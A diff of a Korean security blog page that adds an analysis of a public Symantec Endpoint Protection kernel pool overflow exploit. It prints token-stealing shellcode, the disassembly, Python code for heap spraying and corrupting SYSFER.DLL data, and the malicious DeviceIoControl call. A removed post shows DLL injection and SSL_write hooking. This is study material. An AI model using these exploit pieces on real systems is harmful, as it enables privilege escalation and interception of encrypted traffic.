@@ -9,26 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="@Serianox_: Root detection on Android is useless, so I wrote 200 lines of (ugly) C to prove it. :3 1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20 &hellip;">
+  <meta name="description" content="Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow 참고할만한 문서들은 Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -84,6 +65,525 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/14/symantec-endpoint-protection-kernel-pool-overflow/">Symantec Endpoint Protection - Kernel Pool Overflow</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-14T21:21:58+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:21 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://www.exploit-db.com/exploits/34272/">Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow</a></p>
+
+<p>참고할만한 문서들은</p>
+
+<ul>
+<li><a href="http://slidegur.com/doc/15815/data-only-pwning-microsoft-windows-kernel">Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool Overflows on Microsoft Windows 8.1</a></li>
+<li><a href="https://www.youtube.com/watch?v=-smvfojecvs">Project Heapbleed, BalCCon2k14</a></li>
+<li><a href="http://www.slideshare.net/scovetta/kernelpool">Modern Kernel Pool Exploitation: Attacks and Techniques</a></li>
+<li><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a></li>
+<li><a href="http://packetstorm.interhost.co.il/hitb04/hitb04-sk-chong.pdf">Windows Local Kernel Exploitation, HITBSecCon 2004 Kuala Lumpur</a></li>
+<li><a href="http://www.ntdsxtract.com/downloads/Token_Stealing_old.pdf">Access token stealing on Windows, Csaba Barta, 2009</a></li>
+<li><a href="http://www.uninformed.org/?v=3&amp;a=4&amp;t=pdf">Kernel-mode Payloads on Windows, bugcheck and skape</a></li>
+<li><a href="http://www.uninformed.org/?v=6&amp;a=2&amp;t=pdf">Exploiting 802.11 Wireless Driver Vulnerabilities on Windows</a></li>
+<li><a href="http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Jack_White_Paper.pdf">Remote Windows Kernel Exploitation: Step into the Ring 0</a></li>
+<li><a href="http://securityvulns.ru/docs4946.html">Win32 Device Drivers Communication Vulnerabilities, Lord Yup</a></li>
+<li><a href="http://www.suse.de/~krahmer/no-nx.pdf">x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique</a></li>
+<li>infamous HalDispatchTable</li>
+<li>j00ru&rsquo;s research</li>
+<li><a href="http://www.alex-ionescu.com/?p=231">Alex&rsquo;s lonescu research</a></li>
+<li>Nikita Tarakanov. Kernel Pool Overflow from Windows XP to Windows 8. ZeroNights, 2011</li>
+<li>Kostya Kortchinsky. Real world kernel pool exploitation. SyScan, 2008</li>
+<li>SoBeIt. How to exploit Windows kernel memory pool. X’con, 2005</li>
+<li><a href="http://illmatics.com/Windows%208%20Heap%20Internals.pdf">Windows 8 Heap Internals</a></li>
+<li><a href="https://media.blackhat.com/bh-eu-12/Lee/bh-eu-12-Lee-GDI_Font_Fuzzing-WP.pdf">GDI Font Fuzzing in Windows Kernel for Fun</a></li>
+<li><a href="http://www.nosuchcon.org/talks/2013/D3_02_Nikita_Exploiting_Hardcore_Pool_Corruptions_in_Microsoft_Windows_Kernel.pdf">Exploiting Hardcore Pool Corruptions in Microsoft Windows Kernel</a></li>
+<li><a href="http://j00ru.vexillium.org/?p=290">GDT and LDT in Windows kernel vulnerability exploitation</a></li>
+<li>SoBelt X'con 2005</li>
+<li>Kostya Kortchinsky SyScan 2008</li>
+<li>Tarjei Mandt BH DC 2011</li>
+</ul>
+
+
+<h4>Exploit Strategy</h4>
+
+<p><a href="http://rce4fun.blogspot.kr/2014/07/okaytocloseprocedure-callback-kernel_9.html">OkayToCloseProcedure callback kernel hook</a></p>
+
+<ul>
+<li>IoCompletionReserve object 로 spraying 을 한다음에, close 를 해줘서 hole 을 만든다.</li>
+<li>ioctl() 을 해서 hole 사이에 메모리를 alloc 하고, next object 의 Type Index 를 0 으로 만들어서 type confusion 을 일으킨다.</li>
+<li>이제 handle 을 close 하면, type confusion 때문에 엉뚱한 주소에서 OkayToCloseProcedure 를 읽는다.</li>
+<li>OkayToCloseProcedure 에는 0x00000078 을 넣어놓고, 0x00000078 에는 shellcode 를 세팅해둔다.</li>
+<li>Shellcode 는 Type Index 를 repair 하고, <code>nt authority\SYSTEM</code> 을 훔친다.</li>
+</ul>
+
+
+<h4>Token Stealing Shellcode</h4>
+
+<p>Exploit 에서 사용된 shellcode 는 token stealing shellcode.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tokenstealing = (
+</span><span class='line'>"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
+</span><span class='line'>"\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
+</span><span class='line'>"\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
+</span><span class='line'>"\x00"
+</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Disassemble 해봤다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>33c0                    xor eax,eax
+</span><span class='line'>648b8024010000          mov eax,DWORD PTR fs:[eax+0x124]
+</span><span class='line'>8b4050                  mov eax,DWORD PTR [eax+0x50]
+</span><span class='line'>8bc8                    mov ecx,eax
+</span><span class='line'>loc_0000000e:
+</span><span class='line'>8b80b8000000            mov eax,DWORD PTR [eax+0xb8]
+</span><span class='line'>2db8000000              sub eax,0xb8
+</span><span class='line'>83b8b400000004          cmp DWORD PTR [eax+0xb4],0x4
+</span><span class='line'>75ec                    jne loc_0000000e
+</span><span class='line'>8b90f8000000            mov edx,DWORD PTR [eax+0xf8]
+</span><span class='line'>8991f8000000            mov DWORD PTR [ecx+0xf8],edx
+</span><span class='line'>c21000                  ret 0x10</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>EPROCESS</code> 구조체에서 <code>Token</code> 필드를 조작한다. 상위권한을 가지고 있는 프로세스의 토큰을 카피해 놓는 것이다.
+<code>SYSTEM</code> 프로세스에서 카피하는데 XP, 2003, Vista 에서는 PID 0x4.</p>
+
+<p>Target 이 IDLE 상태라면, <code>FS:[0x124]</code> 가 ETHREAD 를 가리키니까 여기서 EPROCESS 를 구한다.</p>
+
+<h4>Hotpatching SYSFER.DLL</h4>
+
+<ol>
+<li>VirtualAllocEx() 로 cmd.exe 프로세스 내부에 메모리를 할당받는다.</li>
+<li>할당받은 메모리에 크기 <code>0x44c</code> 만큼의 악의적인 데이터를 깔아놓는다. 나중에 이걸로 kernel memory 를 오염시킬것이다.</li>
+<li>SEP 가 cmd.exe 에 inject 한 SYSFER.dll 의 주소를 찾는다.</li>
+<li>저 주소를 베이스로, GetProcAddress() 를 써서 SYSFER.DLL 이 export 한 <code>child_block</code> 과 <code>child_block_size</code> 의 주소를 찾아낸다.</li>
+<li>2 번의 메모리 주소로 <code>child_block</code> 을 overwrite 한다. 이제 <code>child_block</code> 은 악의적인 데이터를 포인팅한다.</li>
+<li><code>0x44c</code> 로 <code>child_block_size</code> 를 overwrite 한다.</li>
+</ol>
+
+
+<h4>Evil child_block</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>""" Allocate the source buffer in the parent process """
+</span><span class='line'>v = kernel32.VirtualAllocEx(phandle, 
+</span><span class='line'>        0x0, 
+</span><span class='line'>        evil_child_block_size, 
+</span><span class='line'>        MEM_RESERVE|MEM_COMMIT, 
+</span><span class='line'>        PAGE_EXECUTE_READWRITE)
+</span><span class='line'># 8654c580  040c0090 ef436f49 00000000 0000005c
+</span><span class='line'># 8654c590  00000000 00000000 00000001 00000001
+</span><span class='line'># 8654c5a0  00000000 0008000a
+</span><span class='line'>quota   = "\x00\x00\x00\x00"   
+</span><span class='line'>header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
+</span><span class='line'>header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
+</span><span class='line'>header += "\x00\x00\x00\x00"
+</span><span class='line'># TypeIndex = "\x0a\x00\x08\x00"
+</span><span class='line'>TypeIndex = "\x00\x00\x08\x00"
+</span><span class='line'>offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-len(quota))
+</span><span class='line'>overflow  = offset + quota + header + TypeIndex 
+</span><span class='line'>csrc      = create_string_buffer(overflow, evil_child_block_size)
+</span><span class='line'>wrote     = c_ulong(0)
+</span><span class='line'>res = kernel32.WriteProcessMemory(phandle, v, 
+</span><span class='line'>        addressof(csrc), 
+</span><span class='line'>        evil_child_block_size, 
+</span><span class='line'>        byref(wrote))</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>IoCompletionReserve</code> 오브젝트를 overwrite 할 것인데, <code>TypeIndex</code> 가 원래는 <code>0x0A</code> 인데 <code>0x00</code> 으로 overwrite 해서 Type Confusion 을 일으킨다. CloseHandle() 할 때, 찾아갈 OkayToCloseProcedure 가 엉뚱한 곳으로 튀게 된다.</p>
+
+<p>아래의 <code>TypeIndex</code> 를 0 으로 overwrite 한다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
+</span><span class='line'>+0x000 PointerCount : Int4B
+</span><span class='line'>+0x004 HandleCount : Int4B
+</span><span class='line'>+0x004 NextToFree : Ptr32 Void
+</span><span class='line'>+0x008 Lock : _EX_PUSH_LOCK
+</span><span class='line'>+0x00c TypeIndex : UChar &lt;- Index of pointer to OBJECT_TYPE structure in ObTypeIndexTable
+</span><span class='line'>+0x00d TraceFlags : Uchar
+</span><span class='line'>+0x00d DbgRefTrace : Pos 0, 1 Bit
+</span><span class='line'>+0x00d DbgTracePermanent : Pos 1, 1 Bit
+</span><span class='line'>+0x00e InfoMask : UChar
+</span><span class='line'>+0x00f Flags : UChar
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>ObTypeIndexTable</code> 을 보면,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dd nt!ObTypeIndexTable 
+</span><span class='line'>81a3edc0 00000000 bad0b0b0 85543768 855436a0
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제 0x85543768 을 _OBJECT_TYPE 으로 덤프해보자.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _OBJECT_TYPE 85543768
+</span><span class='line'>+0x000 TypeList             : _LIST_ENTRY [ 0x85543740 - 0x869c6738 ]
+</span><span class='line'>...
+</span><span class='line'>+0x028 TypeInfo             : _OBJECT_TYPE_INITIALIZER
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제 TypeInfo 를 까보자.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_TYPE_INITIALIZER 0x85543768+0x28
+</span><span class='line'>+0x000 Length               : 0x50
+</span><span class='line'>...
+</span><span class='line'>+0x04c OkayToCloseProcedure : (null)</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>0x28</code> + <code>0x4c</code> = <code>0x74</code> 이니까, <code>Type Index</code> 를 0 으로 세팅하면 <code>0x00000000 + 0x74</code> 에서 <code>OkayToCloseProcedure</code> 를 읽게된다.</p>
+
+<h4>allocShellcode()</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>"\x42" * 0x70
+</span><span class='line'>
+</span><span class='line'>OkayToCloseProcedure (0x00000078)
+</span><span class='line'>
+</span><span class='line'>ADD ESI,0C
+</span><span class='line'>MOV DWORD PTR DS:[ESI],8000A
+</span><span class='line'>SUB ESI,0C # RESTORE TypeIndex
+</span><span class='line'>
+</span><span class='line'>xor eax,eax # Token stealing shellcode
+</span><span class='line'>mov eax,DWORD PTR fs:[eax+0x124]
+</span><span class='line'>mov eax,DWORD PTR [eax+0x50]
+</span><span class='line'>mov ecx,eax
+</span><span class='line'>loc_0000000e:
+</span><span class='line'>mov eax,DWORD PTR [eax+0xb8]
+</span><span class='line'>sub eax,0xb8
+</span><span class='line'>cmp DWORD PTR [eax+0xb4],0x4
+</span><span class='line'>jne loc_0000000e
+</span><span class='line'>mov edx,DWORD PTR [eax+0xf8]
+</span><span class='line'>mov DWORD PTR [ecx+0xf8],edx
+</span><span class='line'>ret 0x10
+</span><span class='line'>
+</span><span class='line'>"\x90"
+</span><span class='line'>"\x90"
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이 쉘코드를 NtAllocateVirtualMemory() 로 <code>0x00000004</code> 에 allocate 한다.</p>
+
+<h4>Spray()</h4>
+
+<p>Spray the kernel pool with IoCompletionReserve objects. Each object is 0x60 bytes in length and is allocated
+from the non-paged kernel pool.</p>
+
+<p>When applications need failure-free delivery of an I/O completion port message, or packet. Typically,
+packets are sent with the PostQueuedCompletionStatus API in Kernelbase.dll, which calls NtSetIoCompletion
+API. Similarly to the user APC, the kernel must allocate an I/O manager structure to contain the completion-packet information,
+and if this allocation failes, the packet cannot be created. With reserve objects, the application can use the
+NtAllocateReserveObject API on startup to have the kernel pre-allocate the I/O completion packet, and the
+NtSetIoCompletionEx system call can be used to supply a handle to this reserve object, guaranteeing a success path.</p>
+
+<p>exploit 을 시작할 시점에는 kernel pool 이 fragmented 되어있기 마련이라, 구멍을 채워줘야한다. 현재 있는 page 들을 꽉 채우고,
+그 이후부터 allocation 을 때리면, 새로운 page 에 sequential 하게 일어날 가능성이 높아진다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>global handles, done
+</span><span class='line'>handles = {}
+</span><span class='line'>for i in range(0,5000):
+</span><span class='line'>    hHandle = HANDLE(0)
+</span><span class='line'>    ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
+</span><span class='line'>    handles[hHandle.value] = hHandle</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li><a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">Exploits for MS10-058, Jeremy Fetiveau</a></li>
+<li><a href="http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html">Stars aligner’s how-to: kernel pool spraying and VMware CVE-2013-1406</a></li>
+</ul>
+
+
+<h4>NtAllocateReserveObject()</h4>
+
+<p>In short, <code>NtAllocateReserveObject</code> makes it possible for any system user to allocate a buffer
+on the non-paged kernel pool, and obtain a HANDLE representation of this buffer in user-mode.
+As it will turn out later in this paper, the above can give us pretty much control over the
+kernel memory, when exploiting custom vulnerabilities.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define APC_OBJECT              0
+</span><span class='line'>#define IO_COMPLETION_OBJECT    1
+</span><span class='line'>#define MAX_OBJECT_ID           1
+</span><span class='line'>
+</span><span class='line'>NTSTATUS STDCALL NtAllocateReserveObject(
+</span><span class='line'>    OUT PHANDLE hObject,
+</span><span class='line'>    IN  POBJECT_ATTRIBUTE ObjectAttributes,
+</span><span class='line'>    IN  DWORD ObjectType)
+</span><span class='line'>{
+</span><span class='line'>    PVOID ObjectBuffer;
+</span><span class='line'>    HANDLE hOutputHandle;
+</span><span class='line'>    NTSTATUS NtStatus;
+</span><span class='line'>
+</span><span class='line'>    if (PreviousMode == UserMode) {
+</span><span class='line'>        // Validate hObject
+</span><span class='line'>    }
+</span><span class='line'>    if (ObjectType &gt; MAX_OBJECT_ID) {
+</span><span class='line'>        /* Bail out: STATUS_INVALID_PARAMETER
+</span><span class='line'>         */
+</span><span class='line'>    } else {
+</span><span class='line'>        NtStatus = ObCreateObject(PreviousMode,
+</span><span class='line'>                                    PspMemoryReserveObjectTypes[ObjectType],
+</span><span class='line'>                                    ObjectAttributes,
+</span><span class='line'>                                    PreviousMode,
+</span><span class='line'>                                    0,
+</span><span class='line'>                                    PspMemoryReserveObjectSizes[ObjectType],
+</span><span class='line'>                                    0,
+</span><span class='line'>                                    0,
+</span><span class='line'>                                    &ObjectBuffer);
+</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
+</span><span class='line'>            /* Bail out: NtStatus
+</span><span class='line'>             */
+</span><span class='line'>
+</span><span class='line'>        memset(ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType]);
+</span><span class='line'>
+</span><span class='line'>        if (ObjectType == IO_COMPLETION) {
+</span><span class='line'>            //
+</span><span class='line'>            // Perform some ObjectBuffer initialization
+</span><span class='line'>            //
+</span><span class='line'>            ObjectBuffer[0x0C] = 3;
+</span><span class='line'>            ObjectBuffer[0x20] = PspIoMiniPacketCallbackRoutine;
+</span><span class='line'>            ObjectBuffer[0x24] = ObjectBuffer;
+</span><span class='line'>            ObjectBuffer[0x28] = 0;
+</span><span class='line'>        }
+</span><span class='line'>        NtStatus = ObInsertObjectEx(ObjectBuffer,
+</span><span class='line'>                                    &hOutputHandle,
+</span><span class='line'>                                    0,
+</span><span class='line'>                                    0xF0003,
+</span><span class='line'>                                    0,
+</span><span class='line'>                                    0,
+</span><span class='line'>                                    0);
+</span><span class='line'>        if (!NT_SUCCESS(NtStatus))
+</span><span class='line'>            /* Bail out: NtStatus
+</span><span class='line'>             */
+</span><span class='line'>        *hObject = hOutputHandle;
+</span><span class='line'>    }
+</span><span class='line'>    return NtStatus;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>DeviceIoControl()</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL WINAPI DeviceIoControl(HANDLE hDevice,
+</span><span class='line'>                            DWORD dwIoControlCode,
+</span><span class='line'>                            LPVOID lpInBuffer,
+</span><span class='line'>                            DWORD nInBufferSize,
+</span><span class='line'>                            LPVOID lpOutputBuffer,
+</span><span class='line'>                            DWORD nOutBufferSize,
+</span><span class='line'>                            LPDWORD lpBytesReturned,
+</span><span class='line'>                            LPOVERLAPPED lpOverlapped);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>파라메터중에서 중요한 것은 <code>hDevice</code>, <code>dwIoControlCode</code>, <code>lpInBuffer</code>, <code>lpOutputBuffer</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dwReturn = c_ulong()
+</span><span class='line'>
+</span><span class='line'>evil_input = "\x41" * 4 + struct.pack("&lt;L", 0x00222084) + "D" * 56
+</span><span class='line'>
+</span><span class='line'>evil_size = len(evil_input)
+</span><span class='line'>einput = create_string_buffer(evil_input, evil_size)
+</span><span class='line'>eoutput = create_string_buffer("\x00" * 1024, 1024)
+</span><span class='line'>driver_handle = kernel32.CreateFilwW( u"\\\\.\\SYSPLANT", GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
+</span><span class='line'>...
+</span><span class='line'>kernel32.DeviceIoControl(driver_handle, 0x00222084, 
+</span><span class='line'>                            addressof(einput), evil_size, 
+</span><span class='line'>                            addressof(eoutput), 1024, 
+</span><span class='line'>                            byref(dwReturn), None)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이 커맨드가 <code>SYSPLANT.sys</code> 의 <code>DriverDispatcher()</code> 에 날라가면 <code>SYSFER.dll</code> 의 <code>child_block</code> 에 담가둔 오염된 데이터때문에 <code>SYSPLANT.sys</code> 가 뻘짓을 하게 되는 흐름.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1526,116 +2026,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/14/hooking-ssl-write/">Hooking SSL_write</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-14T17:55:07+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:55 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4>LoadLibrary() + DLL path</h4>
-
-<p>CreateRemoteThread() 와 minhook 를 사용해서 openssl 을 사용하는 .exe 에 code 를 inject 해서, SSL_write() 을 후킹하여 plaintext 를 덤프하였다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>OpenProcess()
-</span><span class='line'>VirtualAllocEx()
-</span><span class='line'>GetModuleHandle(L"kernel32.dll")
-</span><span class='line'>GetProcAddress(... "LoadLibraryA")
-</span><span class='line'>CreateRemoteThread()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 타겟 프로세스에 DLL 을 inject 한다.</p>
-
-<p><code>OpenProcess()</code> 로 target process 에 attach 한다. 그리고, target process 의 메모리에 메모리를 할당해서, DLL 의 path 를 카피해놓는다.
-그리고, <code>LoadLibraryA()</code> 의 어드레스를 구해서, 이 어드레스가 동일할거라는 가정하에, target process 에 저 어드레스를 시작점으로 remote thread 를 생성한다.
-다행히도 <code>LoadLibraryA()</code> 가 arg 를 1 개만 받으니, thread 를 생성하는 식으로 간편하게 <code>LoadLibraryA()</code> 를 API call 할 수 있다.
-DLL 의 <code>DLL_PROCESS_ATTACH</code> 때 돌아가게 코드를 만들어 놓으면, 간편하게 DLL injection 을 할 수 있다.</p>
-
-<p>Injection 후에,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GetModuleHandle(L"ssleay32.dll")
-</span><span class='line'>GetProcAddress(... "SSL_write")
-</span><span class='line'>MH_Initialize()
-</span><span class='line'>MH_CreateHook()
-</span><span class='line'>MH_EnableHook()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 <code>ssleay32.dll</code> 의 <code>SSL_write()</code> 함수를 detour 시켰다. Detour function 에서 buffer 를 <code>OutputDebugString()</code> 으로 덤프하여 plaintext 를 떨어뜨렸다.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">OutputDebugString</span><span class="p">(</span><span class="s">L&quot;Begin dump...&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">num</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
